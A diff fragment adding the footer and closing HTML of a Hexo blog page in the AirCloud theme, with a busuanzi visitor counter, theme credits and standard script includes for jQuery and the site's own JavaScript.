+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
